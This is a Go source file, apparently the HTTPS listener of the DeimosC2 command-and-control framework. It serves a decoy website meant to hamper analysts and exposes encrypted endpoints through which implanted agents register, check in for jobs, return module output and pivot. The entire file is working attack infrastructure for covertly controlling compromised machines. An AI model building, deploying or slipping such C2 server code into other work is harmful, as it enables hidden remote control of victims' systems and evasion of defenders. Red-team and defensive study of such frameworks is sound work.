package listeners

import (
	"crypto/tls"
	"encoding/base64"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"path"
	"time"

	"github.com/DeimosC2/DeimosC2/c2/agents"
	"github.com/DeimosC2/DeimosC2/c2/lib/certs"
	"github.com/DeimosC2/DeimosC2/c2/lib/validation"
	"github.com/DeimosC2/DeimosC2/lib/crypto"
	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/gorilla/mux"
)

//AdvancedHTTPSOptions holds all the fields needed for the listeners advanced options
type AdvancedHTTPSOptions struct {
	ExistingCert bool                  `json:"existingcert"` //Does the user have a cert?
	CertData     HTTPSListenerCertData `json:"certdata"`
	RegisterPath string                `json:"registerpath"` //HTTP path for registering the agent
	CheckinPath  string                `json:"checkinpath"`  //HTTP path for checking in
	ModulePath   string                `json:"modulepath"`   //HTTP path for module communication
	PivotPath    string                `json:"pivotpath"`    //HTTP path for pivoting
}

//HTTPSListenerCertData holds data on imported HTTPS listener structs
type HTTPSListenerCertData struct {
	Cert string `json:"cert"` //Base64 encoded data of the cert
	Key  string `json:"key"`  //Base64 encoded data of the key
}

//StartHTTPSServer is used to start the https server
func StartHTTPSServer(newListener ListOptions, pr []byte, pu []byte) (*http.Server, bool) {
	logging.Logger.Println("HTTPS Listener Starting")

	m := newListener.Advanced.(map[string]interface{})
	if !validation.ValidateMap(m, []string{"existingCert", "certData", "registerPath", "checkinPath", "modulePath", "pivotPath"}) {
		return nil, false
	}
	cd := m["certData"].(map[string]interface{})
	if !validation.ValidateMap(cd, []string{"customCert", "customKey"}) {
		return nil, false
	}

	advancedOptions := AdvancedHTTPSOptions{
		ExistingCert: m["existingCert"].(bool),
		CertData: HTTPSListenerCertData{
			Cert: cd["customCert"].(string),
			Key:  cd["customKey"].(string),
		},
		RegisterPath: m["registerPath"].(string),
		CheckinPath:  m["checkinPath"].(string),
		ModulePath:   m["modulePath"].(string),
		PivotPath:    m["pivotPath"].(string),
	}

	cwd, err := os.Getwd()
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}

	//When the listener is being started the folder needs to be built
	if _, err := os.Stat(path.Join(cwd, "resources", "listenerresources", newListener.Key)); os.IsNotExist(err) {
		//Make the directory under loot with listeners key
		os.Mkdir(path.Join(cwd, "resources", "listenerresources", newListener.Key), 0755)
	}

	certPath := path.Join(cwd, "resources", "listenerresources", newListener.Key, "cert.pem")
	keyPath := path.Join(cwd, "resources", "listenerresources", newListener.Key, "key.pem")

	if advancedOptions.ExistingCert {
		//Save the files
		writeCertData, err := base64.StdEncoding.DecodeString(advancedOptions.CertData.Cert)
		if err != nil {
			logging.ErrorLogger.Println(err.Error())
		}
		err = ioutil.WriteFile(certPath, []byte(writeCertData), 0755)
		if err != nil {
			logging.ErrorLogger.Println(err.Error())
		}
		writeKeyData, err := base64.StdEncoding.DecodeString(advancedOptions.CertData.Key)
		if err != nil {
			logging.ErrorLogger.Println(err.Error())
		}
		err = ioutil.WriteFile(keyPath, []byte(writeKeyData), 0755)
		if err != nil {
			logging.ErrorLogger.Println(err.Error())
		}

	} else {
		certs.GenerateLocalCert(newListener.Host, "Jan 24 12:00:00 2020", 8760, false, 2048, "P256", false, certPath, keyPath)
	}

	router := mux.NewRouter()

	//Need to make this fake site to be better or even able to be turned off
	router.Methods("GET").Handler(http.FileServer(http.Dir(path.Join(cwd, "resources", "fakesite"))))
	router.PathPrefix("/icons").Handler(http.FileServer(http.Dir(path.Join(cwd, "resources", "fakesite"))))

	router.PathPrefix("/{function}").HandlerFunc(handleConnections(pr, newListener.Key, advancedOptions))

	cfg := &tls.Config{
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
	}

	srv := &http.Server{
		Handler:      router,
		Addr:         ":" + newListener.Port,
		TLSConfig:    cfg,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	logging.Logger.Println("Serving the HTTPS Listener")
	var success = false

	//Make sure port is open, gotta be a better way to do this shit but it works for the moment because if this fails then the server will not be able to actually start.
	ln, err := net.Listen("tcp", ":"+newListener.Port)
	if err != nil {
		success = false

	} else {
		success = true
	}
	ln.Close()

	//Start the server
	go srv.ListenAndServeTLS(certPath, keyPath)

	return srv, success
}

//This will handle all the http connections that come in
func handleConnections(privKey []byte, listenerName string, advancedOptions AdvancedHTTPSOptions) func(w http.ResponseWriter, r *http.Request) {

	return func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		var agentKey string
		var plaintext string
		var ak []byte

		message, err := ioutil.ReadAll(r.Body)
		if err != nil {
			logging.ErrorLogger.Println(err.Error())
		}

		priv := crypto.BytesToPrivateKey(privKey)
		decRSA := crypto.DecryptWithPrivateKey(message[0:256], priv)

		//need a fail statement here for sending users the default page
		agentKey = string(decRSA[:36])
		ak = decRSA[36:]
		decMsg := crypto.Decrypt(message[256:], ak)
		plaintext = string(decMsg)
		externalIP, _, _ := net.SplitHostPort(r.RemoteAddr)

		switch vars["function"] {
		case advancedOptions.RegisterPath:
			nName := register(plaintext, listenerName, false, "", externalIP)
			logging.Logger.Println(nName)
			postReturn(w, r, []byte(nName), ak)
		case advancedOptions.CheckinPath:
			checkIn(plaintext, agentKey, externalIP)
			postReturn(w, r, agents.GetJobs(agentKey), ak)
		case advancedOptions.ModulePath:
			logging.Logger.Println("module called")
			ModHandler(plaintext)
			postReturn(w, r, []byte(""), ak)
		case advancedOptions.PivotPath:
			logging.Logger.Println("Pivot called")
			resp := pivotHandler([]byte(plaintext), agentKey, externalIP)
			postReturn(w, r, []byte(resp), ak)
		default:
			mainPage()

		}
	}

}

//postReturn is used to encrypt the data and return it in the post body for the agents
func postReturn(w http.ResponseWriter, r *http.Request, data []byte, ak []byte) {
	encMsg := crypto.Encrypt(data, ak)
	w.Write(encMsg)
}

//mainPage function basically is called whenever the data doesn't come in right, this is so that someone looking at the site will have a harder time analyzing it.
func mainPage() {
	logging.Logger.Println("Main page called")
	cwd, err := os.Getwd()
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}
	http.FileServer(http.Dir(path.Join(cwd, "resources", "fakesite")))
}
